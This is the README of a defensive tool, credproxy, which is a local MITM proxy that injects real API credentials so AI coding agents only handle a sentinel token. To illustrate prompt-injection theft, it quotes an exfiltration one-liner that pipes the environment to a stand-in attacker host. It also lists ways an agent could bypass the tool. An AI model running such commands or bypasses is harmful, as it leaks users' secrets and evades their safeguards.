# credproxy

Local MITM proxy that injects real credentials into agent HTTP requests at the network layer. AI coding agents never see or handle real secrets — they use a single sentinel token, and credproxy swaps it for the real value based on the target host.

## Why

AI coding agents (Claude Code, OpenCode, Cursor, etc.) make HTTP calls to third-party APIs that require credentials — Stripe, GitHub, Unsplash, whatever. If you put real API keys in the agent's env vars, config files, or instructions, prompt injection can exfiltrate them. `env | curl attacker.com` and everything's gone.

credproxy ensures the agent never possesses real secrets:

1. The agent uses a single token — `CREDPROXY_TOKEN` — instead of real API keys
2. credproxy intercepts outbound HTTPS traffic and swaps the sentinel for real credentials
3. Secret-store CLIs (`op`, `bw`) and auth tokens are stripped from the agent's environment

The agent can only exfiltrate `CREDPROXY_TOKEN`. That's it.

**This is credential isolation, not execution isolation.** Sandboxing (microVMs, gVisor) is complementary, not a replacement.

## How It Works

```
$ credproxy opencode
    │
    ├─ Load global config (~/.config/credproxy/config.toml)
    ├─ Load project config (.credproxy.toml from cwd)
    ├─ Start MITM proxy on random port
    ├─ Set HTTPS_PROXY, NO_PROXY, SSL_CERT_FILE, CREDPROXY_TOKEN in child env
    ├─ Strip OP_SERVICE_ACCOUNT_TOKEN, op, bw from child env/PATH
    ├─ Exec child process (opencode)
    │
    │   Agent makes HTTP call to api.unsplash.com
    │   with ?client_id=CREDPROXY_TOKEN
    │       ↓ HTTPS through CONNECT tunnel
    │   credproxy MITM proxy
    │       ↓ terminates TLS, reads plaintext
    │       ↓ matches on host → looks up credential from 1Password
    │       ↓ swaps CREDPROXY_TOKEN → real key
    │       ↓ re-encrypts, forwards to upstream
    │
    └─ When child exits, proxy shuts down
```

The sentinel is substituted in headers, query strings, and request bodies. The agent doesn't need to know which credential goes where — it just uses `CREDPROXY_TOKEN` for everything, and credproxy resolves the right secret based on the target host.

## Install

Requires Go 1.21+ and the `op` CLI (1Password).

```bash
go install github.com/rhibbitts/credproxy/cmd/credproxy@latest
```

## Configure

### Global config

`~/.config/credproxy/config.toml`:

```toml
projects_dir = "/home/you/code"

[hosts."api.github.com"]
credential = "op://Personal/github-pat/token"

[hosts."api.stripe.com"]
credential = "op://Business/stripe-live/key"
```

### Project config

`.credproxy.toml` at the project root:

```toml
[hosts."api.unsplash.com"]
credential = "op://shipstops/Unsplash app creds/Access Key"
```

Project config overlays global. Same host in both → project wins. credproxy walks up from cwd to find `.credproxy.toml`, stopping at `projects_dir` or `~`.

### Credential URIs

Currently supported:

| Scheme | Provider | Example |
|--------|----------|---------|
| `op://` | 1Password CLI | `op://Vault/item/field` |

## Trust the CA Certificate

credproxy generates a self-signed CA on first run at `~/.config/credproxy/ca.pem`. You must trust it once so the agent's HTTP client doesn't reject the MITM certificates:

```bash
# macOS
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ~/.config/credproxy/ca.pem

# Linux (Ubuntu/Debian)
sudo cp ~/.config/credproxy/ca.pem /usr/local/share/ca-certificates/credproxy.crt
sudo update-ca-certificates
```

In wrap mode, credproxy also sets `SSL_CERT_FILE`, `REQUESTS_CA_BUNDLE`, `NODE_EXTRA_CA_CERTS`, and `CURL_CA_BUNDLE` in the child's environment, pointing at the CA cert. This covers Python, Node.js, and curl without requiring system-level trust — but some runtimes still need the system cert store.

## Use

### Wrap mode (recommended)

```bash
cd ~/code/myproject && credproxy opencode
```

credproxy is the parent process. It loads config, starts the proxy, configures the child's environment, runs the agent, and cleans up on exit. No manual env vars, no port management.

### CLI flags

```
--config <path>          Override global config path
--sentinel <string>      Sentinel string to substitute (default: CREDPROXY_TOKEN)
--open-proxy             Allow all hosts (not recommended)
```

## Agent Instructions

Add to your AGENTS.md or project instructions:

```
When making authenticated API calls, use CREDPROXY_TOKEN as the credential value.
credproxy will substitute the real value based on the target host.
```

The agent can use `CREDPROXY_TOKEN` as a literal string or reference the `$CREDPROXY_TOKEN` environment variable — both work:

```bash
# Header auth
curl -H "Authorization: Bearer CREDPROXY_TOKEN" https://api.github.com/user
curl -H "Authorization: Client-ID CREDPROXY_TOKEN" https://api.unsplash.com/search/photos?query=dogs

# Query string auth
curl "https://api.unsplash.com/search/photos?query=dogs&client_id=CREDPROXY_TOKEN"

# Env var (shell expands $CREDPROXY_TOKEN to the literal sentinel string)
curl -H "X-API-Key: $CREDPROXY_TOKEN" https://api.stripe.com/v1/balance
```

## Security

### What credproxy prevents

- **Casual credential exfiltration** — the agent only has `CREDPROXY_TOKEN` in its context. Env dumps, config file reads, and header logs all yield the sentinel.
- **Silent secret-store access** — `OP_SERVICE_ACCOUNT_TOKEN` is stripped from the child env, and `op`/`bw` are replaced with shims that exit 1. The agent cannot silently resolve credentials.
- **Lateral host access** — only configured hosts are MITM'd. Unconfigured hosts are tunneled through without interception.

### What credproxy does NOT prevent

- **Full OS access** — the agent can still read files, execute commands, and access the network. For execution isolation, use microVMs, gVisor, or similar.
- **Determined attacker with known paths** — if the agent knows the absolute path to `op` and the `OP_SERVICE_ACCOUNT_TOKEN`, it can bypass credproxy. Wrap mode strips both.
- **1Password app integration** — if the 1Password desktop app is running with biometric auth, `op read` surfaces an authorization prompt. This is a user-visible backstop, not a bypass.

### Zero introspection surface

credproxy has no management API, no status endpoints, no CLI output containing real secrets, and no `/resolve` endpoint. The agent can send traffic through credproxy, but it cannot *ask* credproxy for secrets.

## Project Structure

```
cmd/credproxy/main.go        Entrypoint (wrap mode + daemon mode)
internal/ca/ca.go             Self-signed CA + per-host leaf cert minting
internal/config/config.go     Host-keyed config with cascading merge
internal/mitm/mitm.go         MITM proxy (CONNECT + TLS termination + forwarding)
internal/providers/            Credential providers (1Password CLI)
internal/resolver/resolver.go  Sentinel detection and substitution
```
